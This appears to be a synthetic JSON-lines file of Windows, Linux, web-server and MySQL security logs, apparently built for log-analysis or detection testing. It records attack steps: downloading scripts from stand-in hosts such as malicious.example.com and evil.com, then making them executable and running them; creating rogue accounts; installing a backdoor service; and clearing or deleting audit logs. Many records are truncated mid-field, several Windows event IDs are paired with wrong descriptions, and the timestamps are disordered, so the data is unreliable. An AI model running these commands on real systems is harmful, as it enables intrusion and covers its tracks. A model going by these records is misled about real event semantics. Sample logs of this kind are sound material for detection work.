[{"log":"# Windows Security Logs (Majority)"},{"log":"May 26 08:00:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: admin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION01 Source Network Address: 192.168.1.100 Source Port: 52341"},{"log":"May 26 08:00:05 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: root Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: UNKNOWN Source Network Address:"},{"log":"May 26 08:00:15 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: admin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION01 Source Network Address: 192.168.1.100 Source Port: 52342"},{"log":"May 26 08:00:20 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: alice Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: UNKNOWN Source Network Address:"},{"log":"May 26 08:00:30 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION02 Source Network Address: 192.168.1.150 Source Port: 45678"},{"log":""},{"log":"May 26 08:00:45 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: jsmith Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: UNKNOWN Source Network Address: 10.0.0.55 Source Port: 33445"},{"log":"May 26 08:01:00 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: guest Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: HACKER-PC Source Network Address:"},{"log":"May 26 08:01:00 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: guest Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: HACKER-PC Source Network Address: 192.168.1.200 Source Port: 12345"},{"log":""},{"log":"May 26 08:01:15 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: root Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: UNKNOWN Source Network Address: 172.16.1.99 Source Port: 22334"},{"log":""},{"log":"May 26 08:01:30 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: admin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION01 Source Network Address: 192.168.1.100 Source Port: 52343"},{"log":""},{"log":"May 26 08:01:45 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: sqlservice Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: DB-SERVER Source Network Address: 10.10.10.50 Source Port: 1433"},{"log":""},{"log":"May 26 08:02:00 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: backup Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: BACKUP-SRV Source Network Address: 192.168.2.10 Source Port: 445"},{"log":""},{"log":"May 26 08:02:15 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION02 Source Network Address: 192.168.1.150 Source Port: 45679"},{"log":""},{"log":"May 26 08:02:30 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: service Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WEB-SERVER Source Network Address: 172.16.0.20 Source Port: 80"},{"log":""},{"log":"May 26 08:02:45 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: testuser Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: TEST-PC Source Network Address: 192.168.1.75 Source Port: 3389"},{"log":""},{"log":"May 26 08:03:00 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: admin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION01 Source Network Address: 192.168.1.100 Source Port: 52344"},{"log":""},{"log":"May 26 08:03:15 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: ftpuser Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: FTP-CLIENT Source Network Address: 10.0.5.25 Source Port: 21"},{"log":""},{"log":"May 26 08:05:00 WIN-SERVER01 Microsoft-Windows-PowerShell[4103]: CommandInvocation(Get-Process): \"Get-Process\" ParameterBinding(Get-Process): name=\"Name\" value=\"chrome\" ParameterBinding(Get-Process): name=\"ComputerName\" value=\".\" Context: Severity = Informational Host Name = ConsoleHost Host Version = 5.1.19041.610 Host ID = aa5b6e4b-4f54-4a3d-9c1a-2b8c9d8e7f6a Host Application = powershell.exe -Command Get-Process -Name chrome Engine Version = 5.1.19041.610 Runspace ID = abc123de-f456-7890-abcd-ef1234567890 Pipeline ID = 1 Command Name = Get-Process Command Type = Cmdlet Script Name = User = CONTOSO\\jsmith Connected User = CONTOSO\\jsmith"},{"log":""},{"log":"May 26 08:10:00 WIN-SERVER01 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Invoke-WebRequest -Uri \"http://malicious.example.com/download.ps1\" -OutFile \"C:\\temp\\malware.ps1\" ScriptBlock ID: 12345678-1234-5678-9012-123456789abc Path: C:\\temp\\suspicious.ps1"},{"log":""},{"log":"May 26 08:15:00 WIN-SERVER01 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Set-ExecutionPolicy Unrestricted -Force ScriptBlock ID: 87654321-4321-8765-2109-876543210fed Path: "},{"log":""},{"log":"May 26 08:20:00 WIN-SERVER01 Microsoft-Windows-Security-Auditing[4688]: A new process has been created. Creator Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x12345 Target Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x12345 Process Information: New Process ID: 0x1234 New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Token Elevation Type: Default (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x5678 Creator Process Name: C:\\Windows\\explorer.exe Process Command Line: powershell.exe -Command \"Add-LocalUser -Name 'eviluser' -Password (ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)\""},{"log":""},{"log":"May 26 08:25:00 WIN-SERVER01 Microsoft-Windows-Security-Auditing[4732]: A member was added to a security-enabled local group. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x23456 Member: Security ID: S-1-5-21-123456789-123456789-123456789-1010 Account Name: jsmith Group: Security ID: S-1-5-32-544 Group Name: Administrators Group Domain: Builtin Additional Information: Privileges: SeSecurityPrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeSystemtimePrivilege SeShutdownPrivilege SeRemoteShutdownPrivilege SeTcbPrivilege SeCreateTokenPrivilege SeCreatePagefilePrivilege SeCreateGlobalPrivilege SeCreatePermanentPrivilege SeCreateSymbolicLinkPrivilege SeEnableDelegationPrivilege SeTrustedCredManAccessPrivilege SeRelabelPrivilege SeIncreaseWorkingSetPrivilege SeTimeZonePrivilege SeCreateTimeZonePrivilege"},{"log":""},{"log":"May 26 08:30:00 WIN-SERVER01 Microsoft-Windows-Security-Auditing[4697]: A service was installed in the system. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x34567 Service Information: Service Name: MaliciousService Service File Name: C:\\ProgramData\\backdoor.exe Service Type: user mode service Service Start Type: auto start Service Account: LocalSystem"},{"log":""},{"log":"May 26 08:35:00 WIN-SERVER01 Microsoft-Windows-Security-Auditing[4634]: An account was logged off. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x45678 Logon Type: 3"},{"log":""},{"log":"May 26 08:40:00 WIN-SERVER01 Microsoft-Windows-Security-Auditing[1102]: The audit log was cleared. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x56789"},{"log":""},{"log":"May 26 08:45:00 WIN-SERVER02 Microsoft-Windows-Windows Defender[1116]: Windows Defender Antimalware has detected malware or other potentially unwanted software. For more information please see the following: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Emotet.A&threatid=2147685180&enterprise=0 Name: Trojan:Win32/Emotet.A ID: 2147685180 Severity: Severe Category: Trojan Path: C:\\Users\\jsmith\\Downloads\\invoice.exe Detection Origin: User User: CONTOSO\\jsmith Process Name: C:\\Users\\jsmith\\Downloads\\invoice.exe Security intelligence Version: 1.343.658.0 Engine Version: 1.1.18300.4"},{"log":""},{"log":"May 26 08:50:00 WIN-SERVER02 Microsoft-Windows-Windows Defender[1117]: Windows Defender Antimalware has taken action to protect your machine from malware or other potentially unwanted software. For more information please see the following: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Emotet.A&threatid=2147685180&enterprise=0 Name: Trojan:Win32/Emotet.A ID: 2147685180 Severity: Severe Category: Trojan Path: C:\\Users\\jsmith\\Downloads\\invoice.exe Detection Origin: User Action: Quarantine User: CONTOSO\\jsmith Process Name: C:\\Users\\jsmith\\Downloads\\invoice.exe Security intelligence Version: 1.343.658.0 Engine Version: 1.1.18300.4"},{"log":""},{"log":"May 26 09:00:00 WIN-WORKSTATION01 Microsoft-Windows-TerminalServices-RemoteConnectionManager[1149]: Remote Desktop Services: User authentication succeeded: User: CONTOSO\\jsmith Domain: CONTOSO Source Network Address: 192.168.1.150"},{"log":""},{"log":"May 26 09:05:00 WIN-WORKSTATION01 Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Information: Logon Type: 10 Restricted Admin Mode: - Virtual Account: No Elevated Token: Yes Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Logon GUID: {12345678-1234-5678-90ab-123456789abc} Process Information: Process ID: 0x1a2b Process Name: C:\\Windows\\System32\\winlogon.exe Network Information: Workstation Name: WIN-WORKSTATION01 Source Network Address: 192.168.1.150 Source Port: 3389"},{"log":"May 26 09:10:00 WIN-WORKSTATION01 Microsoft-Windows-Security-Auditing[4648]: A logon was attempted using explicit credentials. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Logon Type: 3 New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1002 Account Name: admin Account Domain: CONTOSO Logon ID: 0x67891"},{"log":"May 26 09:15:00 WIN-WORKSTATION01 Microsoft-Windows-Security-Auditing[4672]: A process has exited. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Process Information: Process ID: 0x1a2b Process Name: C:\\Windows\\System32\\notepad.exe Exit Status: 0x0"},{"log":"May 26 09:20:00 WIN-WORKSTATION01 Microsoft-Windows-Security-Auditing[4688]: A new process has been created. Creator Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Target Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Process Information: New Process ID: 0x2b3c New Process Name: C:\\Windows\\System32\\cmd.exe Token Elevation Type: Default (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x1a2b Creator Process Name: C:\\Windows\\System32\\winlogon.exe Process Command Line: cmd.exe /c \"C:\\Users\\jsmith\\Desktop\\script.bat\""},{"log":"May 26 09:25:00 WIN-WORKSTATION01 Microsoft-Windows-Security-Auditing[4673]: A process has been terminated. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Process Information: Process ID: 0x2b3c Process Name: C:\\Windows\\System32\\cmd.exe Exit Status: 0x0"},{"log":"May 26 09:30:00 WIN-WORKSTATION01 Microsoft-Windows-Security-Auditing[4624]: An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Information: Logon Type: 2 Restricted Admin Mode: - Virtual Account: No Elevated Token: Yes Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x67890 Logon GUID: {12345678-1234-5678-90ab-123456789abc} Process Information: Process ID: 0x1a2b Process Name: C:\\Windows\\System32\\winlogon.exe Network Information: Workstation Name: WIN-WORKSTATION01 Source Network Address:"},{"log":""},{"log":"# Windows Logs (Minority)"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: admin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION01 Source Network Address:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: root Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: UNKNOWN Source Network Address:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: guest Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: HACKER-PC Source Network Address:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: alice Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: bob Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: testuser Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: admin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: sqlservice Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: backup Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: administrator Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: service Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":"May 26 07:30:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: testuser Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name:"},{"log":""},{"log":""},{"log":"# Linux Logs (Minority)"},{"log":"May 26 07:30:01 linuxsrv1 sshd[12345]: Failed password for invalid user admin from 192.168.1.75 port 54321 ssh2"},{"log":"May 26 07:30:15 linuxsrv1 sshd[12346]: Failed password for invalid user root from 192.168.1.75 port 54322 ssh2"},{"log":"May 26 07:30:30 linuxsrv1 sshd[12347]: Failed password for invalid user guest from 192.168.1.75 port 54323 ssh2"},{"log":"May 26 07:30:45 linuxsrv1 sshd[12348]: Failed password for user alice from 192.168.1.100 port 45678 ssh2"},{"log":"May 26 07:31:00 linuxsrv1 sshd[12349]: Failed password for user alice from 192.168.1.100 port 45679 ssh2"},{"log":"May 26 07:31:15 linuxsrv1 sshd[12350]: Failed password for user bob from"},{"log":"May 26 07:31:30 linuxsrv1 sshd[12351]: Failed password for user testuser from"},{"log":"May 26 07:31:45 linuxsrv1 sshd[12352]: Failed password for user admin from"},{"log":"May 26 07:32:00 linuxsrv1 sshd[12353]: Failed password for user sqlservice from"},{"log":"May 26 07:32:15 linuxsrv1 sshd[12354]: Failed password for user backup from"},{"log":"May 26 07:32:30 linuxsrv1 sshd[12355]: Failed password for user administrator from"},{"log":"May 26 07:32:45 linuxsrv1 sshd[12356]: Failed password for user service from"},{"log":"May 26 07:35:00 linuxsrv1 sudo[23455]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND"},{"log":"=/bin/chmod 777 /var/log/syslog"},{"log":"May 26 07:40:00 linuxsrv1 sudo[23456]: bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/chown root:root /var/log/syslog"},{"log":"May 26 07:45:00 linuxsrv1 sudo[23457]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND"},{"log":""},{"log":"May 26 09:10:00 linuxsrv1 sudo[23456]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log"},{"log":"May 26 09:15:00 linuxsrv1 sudo[23457]: bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/wget http://malicious.site.com/script.sh -O /tmp/malware.sh"},{"log":"May 26 09:20:00 linuxsrv1 bash[23458]: User=root Command=chmod +x /tmp/malware.sh && /tmp/malware.sh"},{"log":"May 26 09:25:00 linuxsrv1 crontab[23459]: (root) LIST (alice)"},{"log":"May 26 09:30:00 linuxsrv1 crontab[23460]: (root) REPLACE (alice)"},{"log":"May 26 09:35:00 linuxsrv1 crontab[23461]: (root) DELETE (alice)"},{"log":"May 26 09:40:00 linuxsrv1 crontab[23462]: (root) REPLACE (bob)"},{"log":"May 26 09:45:00 linuxsrv1 systemd[1]: Started Daily Cleanup of Temporary Directories."},{"log":""},{"log":"May 26 10:00:00 webserver1 apache2[34567]: 192.168.1.200 - - [26/May/2024:10:00:00 +0000] \"GET /admin/config.php HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\""},{"log":"May 26 10:05:00 webserver1 apache2[34568]: 192.168.1.200 - - [26/May/2024:10:05:00 +0000] \"POST /upload.php HTTP/1.1\" 200 256 \"-\" \"curl/7.68.0\""},{"log":"May 26 10:10:00 webserver1 apache2[34569]: 192.168.1.200 - - [26/May/2024:10:10:00 +0000] \"GET /../../../etc/passwd HTTP/1.1\" 404 512 \"-\" \"sqlmap/1.4.9\""},{"log":"May 26 10:15:00 webserver1 apache2[34570]:"},{"log":"May 26 07:35:01 WIN-DC01 Microsoft-Windows-Security-Auditing[4625]: An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: admin Account Domain: CONTOSO Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Caller Process Name: - Network Information: Workstation Name: WORKSTATION01 Source Network Address: 192.168.1.100 Source Port: 52341"},{"log":""},{"log":""},{"log":"May 26 11:00:00 dbserver1 mysql[45678]: 2024-05-26T11:00:00.123456Z 890 [Note] Access denied for user 'root'@'192.168.1.50' (using password: YES)"},{"log":"May 26 11:05:00 dbserver1 mysql[45679]: 2024-05-26T11:05:00.654321Z 891 [Warning] IP address '192.168.1.50' could not be resolved: Temporary failure in name resolution"},{"log":"May 26 11:10:00 dbserver1 mysql[45680]: 2024-05-26T11:10:00.987654Z 892 [Note] Aborted connection 892 to db: 'users' user: 'admin' host: '192.168.1.50' (Got an error reading communication packets)"},{"log":"May 27 10:15:42 host01 Microsoft-Windows-PowerShell[4104]: CommandInvocation(Invoke-WebRequest): \"Invoke-WebRequest -Uri http://evil.com/malware.ps1\" User = jsmith"},{"log":"May 27 10:20:00 host01 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Invoke-Expression -Command \"C:\\temp\\malware.ps1\" ScriptBlock ID: 12345678-1234-5678-90ab-123456789abc Path: C:\\temp\\malware.ps1"},{"log":"May 27 10:25:00 host01 Microsoft-Windows-PowerShell[4104]: Creating Scriptblock text (1 of 1): Set-ExecutionPolicy Unrestricted -Force ScriptBlock ID: 87654321-4321-8765-2109-876543210fed Path: C:\\temp\\malware.ps1"},{"log":"May 27 10:30:00 host01 Microsoft-Windows-Security-Auditing[4688]: A new process has been created. Creator Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x12345 Target Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: jsmith Account Domain: CONTOSO Logon ID: 0x12345 Process Information: New Process ID: 0x1234 New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Token Elevation Type: Default (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x5678 Creator Process Name: C:\\Windows\\explorer.exe Process Command Line: powershell.exe -Command \"Invoke-WebRequest -Uri 'http://malicious.example.com/download.ps1' -OutFile 'C:\\temp\\malware.ps1'\""},{"log":"May 27 10:35:00 host01 Microsoft-Windows-Security-Auditing[4732]: A member was added to a security-enabled local group. Subject: Security ID: S-1-5-21-123456789-123456789-123456789-1001 Account Name: admin Account Domain: CONTOSO Logon ID: 0x23456 Member: 